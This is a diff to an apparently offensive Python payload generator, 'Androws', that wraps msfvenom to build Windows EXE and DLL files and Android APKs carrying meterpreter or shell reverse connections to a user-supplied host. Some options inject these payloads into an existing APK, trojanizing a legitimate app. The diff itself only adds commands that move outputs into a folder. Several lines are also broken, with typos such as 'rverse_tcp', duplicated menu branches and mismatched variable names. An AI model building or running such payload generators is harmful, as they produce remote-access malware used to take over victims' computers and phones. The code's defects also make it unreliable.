@@ -118,6 +118,7 @@ def main():
             print("Name for payload : "+Name)
             meterpreter = 'msfvenom -p windows/meterpreter/reverse_tcp LHOST='+Lhost+' LPORT='+Lport+' -f exe > '+Name+'.exe'
             os.system(meterpreter)
+            os.system("mv "+Name+".exe output/")
             os.system("zenity --title '☢ Androws ☢' --info --text 'Payload Saved in output folder' --width 400 > /dev/null 2>&1")
             main()
         elif vindows == ("2"):
@@ -129,6 +130,7 @@ def main():
             print("Name for payload : "+Name1)
             Shell = 'msfvenom -p windows/shell_reverse_tcp LHOST='+Lhost1+' LPORT='+Lport1+' -f exe > '+Name1+'.exe'
             os.system(Shell)
+            os.system("mv "+Name1+".exe output/")
             os.system("zenity --title '☢ Androws ☢' --info --text 'Payload Saved in output folder' --width 400 > /dev/null 2>&1")
             main()
         elif vindows == ('3'):
@@ -140,6 +142,7 @@ def main():
             print("Name for payload : "+Name2)
             dll = 'msfvenom -p windows/meterpreter/reverse_tcp LHOST='+Lhost2+' LPORT='+Lport2+' -f dll > '+Name2+'.dll'
             os.system(dll)
+            os.system("mv "+Name2+".dll output/")
             os.system("zenity --title '☢ Androws ☢' --info --text 'Payload Saved in output folder' --width 400 > /dev/null 2>&1")
             main()
         elif vindows == ('4'):
@@ -151,6 +154,7 @@ def main():
             print("Name for payload : "+Name3)
             dllshell = 'msfvenom -p windows/shell_reverse_tcp LHOST='+Lhost3+' LPORT='+Lport3+' -f dll > '+Name3+'.dll'
             os.system(dllshell)
+            os.system("mv "+Name3+".dll output/")
             os.system("zenity --title '☢ Androws ☢' --info --text 'Payload Saved in output folder' --width 400 > /dev/null 2>&1")
             main()
         elif vindows == ("5"):
@@ -199,6 +203,7 @@ def main():
                 print("NAME FOR PAYLOAD :"  +vName)
                 Vdroidp = 'msfvenom -p android/meterpreter/rverse_tcp LHOST='+vLhost+' LPORT='+vLport+' -o output/'+vName+'.apk'
                 os.system(Vdroidp)
+                os.system("mv "+vName+".apk output/")
                 os.system("zenity --title '☢ Androws ☢' --info --text 'Payload Saved in output folder' --width 400 > /dev/null 2>&1")
                 main()
             elif payload == ("2"):
@@ -210,6 +215,7 @@ def main():
                 print("NAME FOR PAYLOAD :"  +vName1)
                 VDroidp1 = 'msfvenom -p android/shell/reverse_tcp LHOST='+vLhost1+' LPORT='+vLport+' -o output/'+vName1+'.apk'
                 os.system(VDroidp1)
+                os.system("mv "+vName1+".apk output/")
                 os.system("zenity --title '☢ Androws ☢' --info --text 'Payload Saved in output folder' --width 400 > /dev/null 2>&1")
                 main()
             elif payload == ("3"):
@@ -221,6 +227,7 @@ def main():
                 print("NAME FOR PAYLOAD :" +vLName2)
                 Vdroidp2 = 'msfvenom -p android/shell/reverse_http LHOST='+vLhost2+' LPORT='+vLport2+' -o output/'+vLName2+'.apk'
                 os.system(Vdroidp2)
+                os.system("mv "+vLName2+".apk output/")
                 os.system("zenity --title '☢ Androws ☢' --info --text 'Payload Saved in output folder' --width 400 > /dev/null 2>&1")
                 main()
             elif payload == ('4'):
@@ -232,6 +239,7 @@ def main():
                 print("VLNAME FOR PAYLOAD :" +VLname3)
                 Vdroidp3 = 'msfvenom -p android/shell/reverse_https LHOST='+VLhost3+' LPORT='+VLport3+' -o output/'+VLname3+'.apk'
                 os.system(Vdroidp3)
+                os.system("mv "+VLName3+".apk output/")
                 os.system("zenity --title '☢ Androws ☢' --info --text 'Payload Saved in output folder' --width 400 > /dev/null 2>&1")
                 main()
             elif payload == ('5'):
@@ -243,6 +251,7 @@ def main():
                 print("VDROID FOR PAYLOAD :" +VLname4)
                 Vdroidp4 = 'msfvenom -p android/meterpreter/reverse_http LHOST='+VLhost4+' LPORT='+VLport4+' -o output/'+VLname4+'.apk'
                 os.system(Vdroidp4)
+                os.system("mv "+VLName4+".apk output/")
                 os.system("zenity --title '☢ Androws ☢' --info --text 'Payload Saved in output folder' --width 400 > /dev/null 2>&1")
                 main()
             elif payload == ('5'):
@@ -254,6 +263,7 @@ def main():
                 print("VDROID FOR PAYLOAD :" +VLname5)
                 Vdroidp5 = 'msfvenom -p android/meterpreter/reverse_https LHOST='+VLhost5+' LPORT='+VLport5+' -o output/'+VLname5+'.apk'
                 os.system(Vdroidp5)
+                os.system("mv "+VLName5+".apk output/")
                 os.system("zenity --title '☢ Androws ☢' --info --text 'Payload Saved in output folder' --width 400 > /dev/null 2>&1")
                 main()
             elif payload == 'e':
@@ -279,6 +289,7 @@ def main():
                 Vpath100 = input("VDROID==>[PATH FOR APK FILE] ")
                 Vdroidp100 = 'msfvenom -x '+Vpath100+' -p android/meterpreter/rverse_tcp LHOST='+vLhost100+' LPORT='+vLport100+' -o output/'+vName100+'.apk'
                 os.system(Vdroidp100)
+                os.system("mv "+vName100+".apk output/")
                 os.system("zenity --title '☢ Androws ☢' --info --text 'Payload Saved in output folder' --width 400 > /dev/null 2>&1")
                 main()
             elif payload1 == ("2"):
@@ -291,6 +302,7 @@ def main():
                 Vpath111 = input("VDROID==>[PATH FOR APK FILE] ")
                 VDroidp111 = 'msfvenom -x '+Vpath111+' -p android/shell/reverse_tcp LHOST='+vLhost111+' LPORT='+vLport111+' -o output/'+vName111+'.apk'
                 os.system(VDroidp111)
+                os.system("mv "+vName111+".apk output/")
                 os.system("zenity --title '☢ Androws ☢' --info --text 'Payload Saved in output folder' --width 400 > /dev/null 2>&1")
                 main()
             elif payload1 == ("3"):
@@ -303,6 +315,7 @@ def main():
                 vpath112 = input("Vindows==>[PATH FOR APK FILE] ")
                 Vdroidp112 = 'msfvenom -x '+vpath112+' -p android/shell/reverse_http LHOST='+vLhost112+' LPORT='+vLport112+' -o output/'+vLName112+'.apk'
                 os.system(Vdroidp112)
+                os.system("mv "+vLName112+".apk output/")
                 os.system("zenity --title '☢ Androws ☢' --info --text 'Payload Saved in output folder' --width 400 > /dev/null 2>&1")
                 main()
             elif payload1 == ('4'):
@@ -315,6 +328,7 @@ def main():
                 Vpath113 = input("VDROID==>[PATH FOR APK FILE] ")
                 Vdroidp113 = 'msfvenom -x '+Vpath113+' -p android/shell/reverse_https LHOST='+VLhost3+' LPORT='+VLport3+' -o output/'+VLname3+'.apk'
                 os.system(Vdroidp113)
+                os.system("mv "+VLName3+".apk output/")
                 os.system("zenity --title '☢ Androws ☢' --info --text 'Payload Saved in output folder' --width 400 > /dev/null 2>&1")
                 main()
             elif payload1 == ('5'):
@@ -327,6 +341,7 @@ def main():
                 Vpath114 = input("VDROID==>[PATH FOR APK FILE] ")
                 Vdroidp114 = 'msfvenom -x '+Vpath114+' -p android/meterpreter/reverse_http LHOST='+VLhost114+' LPORT='+VLport114+' -o output/'+VLname114+'.apk'
                 os.system(Vdroidp114)
+                os.system("mv "+VLName114+".apk output/")
                 os.system("zenity --title '☢ Androws ☢' --info --text 'Payload Saved in output folder' --width 400 > /dev/null 2>&1")
                 main()
             elif payload1 == ('5'):
@@ -339,6 +354,7 @@ def main():
                 Vpath115 = input("VDROID==>[PATH FOR APK FILE] ")
                 Vdroidp115 = 'msfvenom -x '+Vpath115+' -p android/meterpreter/reverse_https LHOST='+VLhost115+' LPORT='+VLport115+' -o output/'+VLname115+'.apk'
                 os.system(Vdroidp115)
+                os.system("mv "+VLName115+".apk output/")
                 os.system("zenity --title '☢ Androws ☢' --info --text 'Payload Saved in output folder' --width 400 > /dev/null 2>&1")
                 main()
             elif payload1 == ('e'):
